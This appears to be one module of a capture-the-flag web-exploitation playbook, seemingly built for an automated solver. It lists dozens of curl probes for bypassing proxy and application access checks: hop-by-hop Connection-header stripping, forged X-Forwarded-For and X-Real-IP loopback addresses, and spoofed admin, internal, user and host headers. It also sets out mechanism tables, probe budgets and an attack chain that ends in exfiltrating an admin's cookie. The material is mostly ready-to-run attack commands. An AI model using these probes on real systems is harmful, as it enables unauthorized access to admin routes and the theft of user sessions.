# Extended corpus — the remaining probes and mechanisms

The long tail — the probes and mechanisms not covered in the other modules.

---

## 1. The per-route probes — the gated routes

```bash
# an authenticated-only route — a token_required check
curl "$BASE/api/copy_signal_trade" -d 'data'   # a 401 — token required
curl "$BASE/api/copy_signal_trade" -d 'data' -H 'Connection: keep-alive, X-Real-IP'   # a 200 — the strip worked
# an internal route — an internal check
curl "$BASE/internal"   # a 403 — internal check
curl "$BASE/internal" -H 'X-Internal: true'   # a 200 — the check bypassed
curl "$BASE/internal" -H 'Connection: keep-alive, X-Real-IP'   # a 200 — the strip worked
# an admin route — an admin check
curl "$BASE/admin"   # a 403 — admin check
curl "$BASE/admin" -H 'X-Admin: true'   # a 200 — the check bypassed
curl "$BASE/admin" -H 'Connection: keep-alive, X-Real-IP'   # a 200 — the strip worked
# a debug route — a debug check
curl "$BASE/api/debug"   # a 403 — debug check
curl "$BASE/api/debug" -H 'X-Debug: true'   # a 200 — the check bypassed
curl "$BASE/api/debug" -H 'Connection: keep-alive, X-Real-IP'   # a 200 — the strip worked
```

## 2. The per-header probes — the proxy's headers

```bash
# the proxy's headers — a proxy in the path
curl -sI "$BASE/" | grep -iE 'x-forwarded|x-real|via:|x-served|server|x-backend|x-upstream|cf-|x-varnish|traefik'
#   a Via header → a proxy chain
#   an X-Forwarded-* → a proxy's forwarded headers
#   an X-Real-IP → a proxy's client-IP header
#   an X-Served-By / an X-Varnish → a Fastly/Varnish proxy
#   a CF-* / an X-Amzn-* → a Cloudflare/CloudFront edge
#   a Server: traefik → a Traefik proxy
```

## 3. The per-proxy probes — the proxy's strip

```bash
# naming the proxy's own header in Connection — the strip probes
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Real-IP'   # the proxy's client-IP header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-For'   # the forwarded header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Host'   # the forwarded host
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Proto'   # the forwarded proto
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Internal'   # the internal header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Admin'   # the admin header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, Authorization'   # the auth header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Original-URL'   # the original-URL header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Rewrite-URL'   # the rewrite-URL header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-User'   # the forwarded-user header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Email'   # the forwarded-email header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Client-IP'   # the client-IP header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, True-Client-IP'   # the true-client-IP header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Server'   # the forwarded-server header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, Forwarded'   # the RFC 7239 Forwarded header
```

## 4. The per-surface probes — the app's trust check

```bash
# the app's trust check — a header the app reads
curl "$BASE/api/admin" -H 'X-Real-IP: 127.0.0.1'   # a forged local IP
curl "$BASE/api/admin" -H 'X-Forwarded-For: 127.0.0.1'   # a forged local IP
curl "$BASE/api/admin" -H 'X-Forwarded-For: 127.0.0.1, 8.8.8.8'   # a chained forwarded
curl "$BASE/api/admin" -H 'X-Client-IP: 127.0.0.1'   # a forged client-IP
curl "$BASE/api/admin" -H 'True-Client-IP: 127.0.0.1'   # a forged true-client-IP
curl "$BASE/api/admin" -H 'Forwarded: for=127.0.0.1'   # a forged RFC 7239
curl "$BASE/api/admin" -H 'X-Forwarded-Host: attacker.com'   # a forged host
curl "$BASE/api/admin" -H 'X-Forwarded-Proto: http'   # a forged proto
curl "$BASE/api/admin" -H 'X-Forwarded-Scheme: http'   # a forged scheme
curl "$BASE/api/admin" -H 'X-Internal: true'   # a forged internal flag
curl "$BASE/api/admin" -H 'X-Admin: true'   # a forged admin flag
curl "$BASE/api/admin" -H 'X-Debug: true'   # a forged debug flag
curl "$BASE/api/admin" -H 'X-Forwarded-User: admin'   # a forged user
curl "$BASE/api/admin" -H 'X-Forwarded-Email: admin@target.com'   # a forged email
curl "$BASE/api/admin" -H 'X-Forwarded-Server: 127.0.0.1'   # a forged server
```

## 5. The per-mechanism probes — the parser-differential mechanisms

```text
a hop-by-hop bypass        → a proxy strips its own header → a missing-
                           header fallback → the trust check bypassed
a client-supplied bypass   → a forged proxy header → the app trusts it →
                           the trust check bypassed
a forwarded-host rewrite   → a forged host → the app's links rewritten
a forwarded-scheme downgrade → a forged scheme → the app's links rewritten
an X-Original-URL rewrite  → a forged path → the app's path rewritten
an internal-flag bypass    → a forged internal flag → the check bypassed
an admin-flag bypass       → a forged admin flag → the check bypassed
a forwarded-for spoof      → a forged local IP → the check bypassed
a forwarded-user spoof     → a forged user → the check bypassed
a path-normalization bypass → a normalization differential → a route-confusion
a method-override bypass   → a forged method → a method-override
a multi-proxy differential → a chained normalization → a per-layer differential
```

## 6. The per-evidence probes — the bypass's readback

```bash
# the readback — the downstream's effect read back
python3 tools/web/http_probe.py --method POST --url "$BASE/api/restricted" \
  --body 'data' --header 'Connection: keep-alive, X-Real-IP' --save
#   the response carries the restricted route's output — the bypass's
#   reach — the downstream's read
```

## 7. The per-falsifier probes — the dead paths

```text
a proxy that doesn't strip its own header → the hop-by-hop bypass fails
a proxy that strips a client-supplied header → the client-supplied
  bypass fails → the hop-by-hop bypass is the vector
a proxy that verifies the header it added → the client-supplied bypass
  fails → the hop-by-hop bypass is the vector
a non-header check → a different class
the proxy and the app normalize the same way → no confusion
a stored copy → a cache-poisoning
a desync → a request-smuggling
a session check → an auth-session
a host check → a host-header
a fetch → an ssrf
a read → a cors
```

## 8. The per-budget probes — the probe limits

```text
5 probes or 15 minutes per mechanism class; 25 probes or 45 minutes
for the challenge. a spent budget → escalate: chain_match → reclassify
→ writeup_search → novel_plan → fanout_sweep → solver_handoff.
```

## 9. The per-chain probes — the verified card's chain

```text
the verified card's chain:
step 1 — a proxy strips its own X-Real-IP → the app treats the request
         as local → the token_required check bypassed → a restricted
         route reached
step 2 — a cache-overflow → the cache daemon's strcpy overflows a
         fixed-size value → the write lands in the next entry's key →
         another user's record addressed
step 3 — a DOM-clobber prototype-pollution → the site's own script's
         DOM lookups clobbered → the fetch redirected → the prototype
         polluted → the eval's value attacker-controlled
step 4 — a polyglot exfil → the admin's cookie exfiltrated through the
         same-site store → the flag
```

## 10. The per-skill probes — the sibling classes

```text
a cache-poisoning       → a stored copy that serves YOUR input — a
                        key-mismatch — a store
a request-smuggling     → a front-end and a back-end parse the request
                        boundary differently — a desync
an auth-session         → a trust check reads a session / a token
a host-header           → a Host-header injection — a forged host
an ssrf                 → a server-side fetch — the app fetches a URL
a cors                  → a cross-origin fetch — the app's bytes read
```
